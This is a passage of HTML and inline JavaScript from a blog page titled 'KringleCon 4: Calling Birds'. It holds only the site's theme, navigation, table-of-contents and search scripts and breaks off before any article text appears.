<!DOCTYPE html>
<html lang="en" dir="ltr">

<head prefix="og: http://ogp.me/ns#">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>KringleCon 4: Calling Birds – noobintheshell :: blog</title>
    




<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>

<script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>

<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>

<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>

<script defer src="/js/helper/closest.min.js"></script>
  
<script>
  "use strict";

  
  
  if (window.NodeList && !NodeList.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
  }

  
  if (!String.prototype.includes) {
    String.prototype.includes = function (search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }

  
  Document.prototype.append = Element.prototype.append = function append() {
    this.appendChild(_mutation(arguments));
  };
  function _mutation(nodes) {
    if (!nodes.length) {
      throw new Error('DOM Exception 8');
    } else if (nodes.length === 1) {
      return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
    } else {
      var
      fragment = document.createDocumentFragment(),
      length = nodes.length,
      index = -1,
      node;

      while (++index < length) {
        node = nodes[index];

        fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
      }

      return fragment;
    }
  }

  
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0;
      return this.indexOf(searchString, position) === position;
    };
  }
  


  document.addEventListener('DOMContentLoaded', function () {
    
    var navCollapseBtn = document.querySelector('.navbar__burger');
    navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
      var navCollapse = document.querySelector('.navbarm__collapse');

      if (navCollapse) {
        var dataOpen = navCollapse.getAttribute('data-open');

        if (dataOpen === 'true') {
          navCollapse.setAttribute('data-open', 'false');
          navCollapse.style.maxHeight = 0;
          navCollapseBtn.classList.remove('is-active');
        } else {
          navCollapse.setAttribute('data-open', 'true');
          navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
          navCollapseBtn.classList.add('is-active');
        }
      }
    }) : null;
    


    
    var tables = document.querySelectorAll('.single__contents > table');
    for (let i = 0; i < tables.length; i++) {
      var table = tables[i];
      var wrapper = document.createElement('div');
      wrapper.className = 'table-wrapper';
      table.parentElement.replaceChild(wrapper, table);
      wrapper.appendChild(table);
    }
    


    
    var footNoteRefs = document.querySelectorAll('.footnote-ref');
    var footNoteBackRefs = document.querySelectorAll('.footnote-backref');

    footNoteRefs ? 
    footNoteRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function () {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;

    footNoteBackRefs ? 
    footNoteBackRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function() {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;
    


    
    var summaryContainer = document.querySelector('.summary__container');
    var searchResult = document.querySelector('.search-result');
    var searchResultCloseBtn = document.querySelector('.search-result__close');
    searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
      searchResult.setAttribute('data-display', 'none');
      summaryContainer.setAttribute('data-display', 'block');
    }) : null;
    


    
    document.querySelectorAll('.tab') ? 
    document.querySelectorAll('.tab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var tabLinks = elem.querySelectorAll('.tab__link');
      var tabContents = elem.querySelectorAll('.tab__content');
      var ids = [];

      tabLinks && tabLinks.length > 0 ?
      tabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                tabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              tabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    document.querySelectorAll('.codetab') ? 
    document.querySelectorAll('.codetab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var codetabLinks = elem.querySelectorAll('.codetab__link');
      var codetabContents = elem.querySelectorAll('.codetab__content');
      var ids = [];

      codetabLinks && codetabLinks.length > 0 ?
      codetabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                codetabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              codetabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    var gttBtn = document.getElementById("gtt");
    gttBtn.style.display = "none";
    gttBtn.addEventListener('click', function () {
      if (window.document.documentMode) {
        document.documentElement.scrollTop = 0;
      } else {
        scrollToTop(250);
      }
    });

    function scrollToTop(scrollDuration) {
      var scrollStep = -window.scrollY / (scrollDuration / 15);
      var scrollInterval = setInterval(function () {
        if (window.scrollY != 0) {
          window.scrollBy(0, scrollStep);
        }
        else clearInterval(scrollInterval);
      }, 15);
    }

    var scrollFunction = function () {
      if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
        gttBtn.style.display = "block";
      } else {
        gttBtn.style.display = "none";
      }
    }
    


    
    var expandBtn = document.querySelectorAll('.expand__button');

    for (let i = 0; i < expandBtn.length; i++) {
      expandBtn[i].addEventListener("click", function () {
        var content = this.nextElementSibling;
        if (content.style.maxHeight) {
          content.style.maxHeight = null;
          this.querySelector('svg').classList.add('expand-icon__right');
          this.querySelector('svg').classList.remove('expand-icon__down');
        } else {
          content.style.maxHeight = content.scrollHeight + "px";
          this.querySelector('svg').classList.remove('expand-icon__right');
          this.querySelector('svg').classList.add('expand-icon__down');
        }
      });
    }
    


    
    var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var tocElem = document.querySelector('.toc');
    var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
    var toggleTocElem = document.getElementById('toggle-toc');
    var singleContentsElem = document.querySelector('.single__contents');
    var navbar = document.querySelector('.navbar');
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var expandContents = document.querySelectorAll('.expand__content');
    var boxContents = document.querySelectorAll('.box');
    var notAllowedTitleIds = null;

    
    var tocFolding = JSON.parse("true");
    
    var tocLevels = JSON.parse("[\"h2\",\"h3\",\"h4\"]");
    
    if (tocLevels) {
      tocLevels = tocLevels.toString();
    } else {
      tocLevels = "h1, h2, h3, h4, h5, h6";
    }

    
    singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
    singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    expandContents ? expandContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    boxContents ? boxContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    window.onscroll = function () {
      scrollFunction();
      
      var st = window.pageYOffset || document.documentElement.scrollTop;
      if (st > lastScrollTop) { 
        if (st < 250) {
          gttBtn.style.display = "none";
        } else {
          gttBtn.style.display = "block";
        }

        if (st < 45) {
          return null;
        }

        if (navbar.classList.contains('scrolling')) {
          if (!navbar.classList.contains('navbar--hide')) {
            navbar.classList.add('navbar--hide');
          } else if (navbar.classList.contains('navbar--show')) {
            navbar.classList.remove('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }

              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }
              
              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox) {
              tocFlexbox.setAttribute('data-position', '');
              if (!tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
            }
            if (tocFlexboxOuter) {
              tocFlexboxOuter.setAttribute('data-position', '');
              if (!tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }
          }
        }
      } else { 
        if (st < 250) {
          gttBtn.style.display = "none";
        }

        if (navbar.classList.contains('scrolling')) {
          if (navbar.classList.contains('navbar--hide')) {
            navbar.classList.remove('navbar--hide');
          } else if (!navbar.classList.contains('navbar--show')) {
            navbar.classList.add('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }
              
              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }

              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
            if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
          
        }

        if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
          if (false === tocFolding) {

          } else {
            tableOfContentsElem.querySelector('ul') ?
              tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                liElem.querySelectorAll('ul').forEach(function (ulElem) {
                  ulElem.style.display = 'none';
                });
              }) : null;
          }
        }
      }
      lastScrollTop = st <= 0 ? 0 : st;
    };
  


  
    var localTheme = localStorage.getItem('theme');
    var rootEleme = document.getElementById('root');
    var selectThemeElem = document.querySelectorAll('.select-theme');
    var selectThemeItemElem = document.querySelectorAll('.select-theme__item');
    
    
    var skinDarkCode = JSON.parse("\"dark\"");
    
    var skinLightCode = JSON.parse("\"light\"");
    
    var skinHackerCode = JSON.parse("\"hacker\"");
    
    var skinSolarizedCode = JSON.parse("\"solarized\"");
    
    var skinKimbieCode = JSON.parse("\"kimbie\"");

    var setMetaColor = function(themeColor) {
      var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
      var metaThemeColor = document.getElementsByName('theme-color')[0];
      var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
      var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName('apple-mobile-web-app-status-bar-style')[0];

      if (themeColor.includes('dark')) {
        metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
        metaThemeColor.setAttribute('content', '#403E41');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
      } else if (themeColor.includes('light')) {
        metaMsapplicationTileColor.setAttribute('content', '#555');
        metaThemeColor.setAttribute('content', '#eee');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
      } else if (themeColor.includes('hacker')) {
        metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
        metaThemeColor.setAttribute('content', '#252526');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
      } else if (themeColor.includes('solarized')) {
        metaMsapplicationTileColor.setAttribute('content', '#d3af86');
        metaThemeColor.setAttribute('content', '#51412c');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
      } else if (themeColor.includes('kimbie')) {
        metaMsapplicationTileColor.setAttribute('content', '#586e75');
        metaThemeColor.setAttribute('content', '#eee8d5');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
      }
    }

    var parseSkinCode = function(themeText) {
      if (themeText === skinDarkCode) {
        return 'dark';
      } else if (themeText === skinLightCode) {
        return 'light';
      } else if (themeText === skinHackerCode) {
        return 'hacker';
      } else if (themeText === skinSolarizedCode) {
        return 'solarized';
      } else if (themeText === skinKimbieCode) {
        return 'kimbie';
      }
    }
    
    if (localTheme) {
      selectThemeItemElem ? 
      selectThemeItemElem.forEach(function (elem) {
        if (elem.text.trim() === localTheme) {
          elem.classList.add('is-active');
        } else {
          elem.classList.remove('is-active');
        }
      }) : null;

      setMetaColor(localTheme);
    } else {
      setMetaColor(rootEleme.className);
    }

    selectThemeItemElem ? 
    selectThemeItemElem.forEach(function (v, i) {
      v.addEventListener('click', function (e) {
        var selectedThemeVariant = parseSkinCode(e.target.text.trim());
        localStorage.setItem('theme', selectedThemeVariant);
        setMetaColor(selectedThemeVariant);

        rootEleme.removeAttribute('class');
        rootEleme.classList.add('theme__' + selectedThemeVariant);
        selectThemeElem.forEach(function(rootElem) {
          rootElem.querySelectorAll('a').forEach(function (elem) {
            if (elem.classList) {
              if (elem.text.trim() === selectedThemeVariant) {
                if (!elem.classList.contains('is-active')) {
                  elem.classList.add('is-active');
                }
              } else {
                if (elem.classList.contains('is-active')) {
                  elem.classList.remove('is-active');
                }
              }
            }
          });
        });

        if (window.mermaid) {
          if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
            mermaid.initialize({ theme: 'dark' });
            location.reload();
          } else {
            mermaid.initialize({ theme: 'default' });
            location.reload();
          }
        }

        var utterances = document.getElementById('utterances');
        if (utterances) {
          utterances.querySelector('iframe').contentWindow.postMessage({
            type: 'set-theme',
            theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
          }, 'https://utteranc.es');
        }

        var twitterCards = document.querySelectorAll('.twitter-timeline');
        if (twitterCards) {
          window.postMessage({
            type: 'set-twitter-theme',
            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
          });
        }
      });
    }) : null;
  


  
    
    var baseurl = JSON.parse("\"https://noobintheshell.com\"");
    
    var permalink = JSON.parse("\"https://noobintheshell.com/posts/kringlecon4/\"");
    
    var langprefix = JSON.parse("\"\"");
    var searchResults = null;
    var searchMenu = null;
    var searchText = null;
    
    
    var enableSearch = JSON.parse("false");
    
    var enableSearchHighlight = JSON.parse("false");
    
    var searchResultPosition = JSON.parse("\"main\"");
    
    var sectionType = JSON.parse("\"posts\"");
    
    var kind = JSON.parse("\"page\"");
    
    var fuse = null;

    if (enableSearch) {
      (function initFuse() {
        var xhr = new XMLHttpRequest();
        if (sectionType === "publication" && kind !== "page") {
          xhr.open('GET', permalink + "index.json");
        } else {
          xhr.open('GET', baseurl + langprefix + "/index.json");
        }
        
        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        xhr.onload = function () {
          if (xhr.status === 200) {
            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
              keys: sectionType.includes('publication') ? ['title', 'abstract'] : ['title', 'description', 'content'],
              includeMatches: enableSearchHighlight,
              shouldSort: true, 
              threshold: 0.4, 
              location: 0, 
              distance: 100, 
              maxPatternLength: 32,
              minMatchCharLength: 1,
              isCaseSensitive: false, 
              findAllMatches: false, 
              useExtendedSearch: false, 
            });
            window.fuse = fuse;
          }
          else {
            console.error('[' + xhr.status + ']Error:', xhr.statusText);
          }
        };
        xhr.send();
      })();
    }

    function makeLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      
      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.permalink);

      var descDiv = document.createElement('div');
      descDiv.setAttribute('class', 'search-result__item--desc');
      if (obj.item.description) {
        descDiv.innerHTML = obj.item.description;
      } else if (obj.item.content) {
        descDiv.innerHTML = obj.item.content.substring(0, 225);
      }
      
      li.appendChild(a);
      li.appendChild(descDiv);
      ulElem.appendChild(li);
    }

    function makeHighlightLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      var descDiv = null;

      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      if (obj.matches && obj.matches.length) {
        for (var i = 0; i < obj.matches.length; i++) {
          if ('title' === obj.matches[i].key) {
            a = document.createElement('a');
            a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
            a.setAttribute('class', 'search-result__item--title');
            a.setAttribute('href', obj.item.uri);
          }
          
          if ('description' === obj.matches[i].key) {
            descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'search-result__item--desc');
            descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
          } else if ('content' === obj.matches[i].key) {
            if (!descDiv) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i].indices);
            }
          } else {
            if (obj.item.description) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.description;
            } else {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.content.substring(0, 150);
            }
          }
        }

        li.appendChild(a);
        if (descDiv) {
          li.appendChild(descDiv);
        }
        if (li) {
          ulElem.appendChild(li);
        }
      }
    }

    function renderSearchResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');
      
      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          a.setAttribute('href', result.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.title;
          titleDiv.setAttribute('class', 'menu-item__title');

          var descDiv = document.createElement('div');
          descDiv.setAttribute('class', 'menu-item__desc');
          if (result.description) {
            descDiv.innerHTML = result.description;
          } else if (result.content) {
            descDiv.innerHTML = result.content.substring(0, 150);
          }

          li.appendChild(titleDiv);
          li.appendChild(descDiv);
          ul.appendChild(a);
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      
      searchMenu.appendChild(ul);
    }

    function renderSearchHighlightResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');

      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'menu-item__title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'menu-item__desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      searchMenu.appendChild(ul);
    }

    function renderSearchResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var content = document.createElement('div');
      content.setAttribute('class', 'mobile-search__content');

      if (results.length > 0) {
        results.forEach(function (result) {
          var item = document.createElement('a');
          item.setAttribute('href', result.uri);
          item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">📄 ' + result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result.description : result.content) + '</div></div>';
          content.appendChild(item);
        });
      } else {
        var item = document.createElement('span');
        content.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(content);      
    }

    function renderSearchHighlightResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var ul = document.createElement('div');
      ul.setAttribute('class', 'mobile-search__content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.appendChild(li);
          li.setAttribute('class', 'mobile-search__item');

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'mobile-search__item--title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'mobile-search__item--desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var item = document.createElement('span');
        ul.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(ul);
    }

    function generateHighlightedText(text, regions) {
      if (!regions) {
        return text;
      }

      var content = '', nextUnhighlightedRegionStartingIndex = 0;

      regions.forEach(function(region) {
        if (region[0] === region[1]) {
          return null;
        }
        
        content += '' +
          text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
          '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
          '</span>' +
        '';
        nextUnhighlightedRegionStartingIndex = region[1] + 1;
      });

      content += text.substring(nextUnhighlightedRegionStartingIndex);

      return content;
    };

    var searchElem = document.getElementById('search');
    var searchMobile = document.getElementById('search-mobile');
    var searchResultsContainer = document.getElementById('search-results');

    searchElem ?
    searchElem.addEventListener('input', function(e) {
      if (!e.target.value | window.innerWidth < 770) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      
      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }
        
        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function(item) {
          item.addEventListener('mousedown', function(e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    searchElem ? 
    searchElem.addEventListener('blur', function() {
      if (window.innerWidth < 770) {
        return null;
      }
      searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
    }) : null;

    searchElem ? 
    searchElem.addEventListener('click', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }
      if (!e.target.value) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);

      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else{
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }

        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function (item) {
          item.addEventListener('mousedown', function (e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    var searchMenuElem = document.getElementById("search-menu");
    var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
    var activeIndex = null;
    var items = null;
    var searchContainerMaxHeight = 350;

    searchElem ? 
    searchElem.addEventListener('keydown', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }

      if (e.key === 'Escape') {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      }

      var items = document.querySelectorAll('#search-menu .dropdown-item');
      var keyCode = e.which || e.keyCode;

      if (!items || !items.length) {
        return null;
      }
      
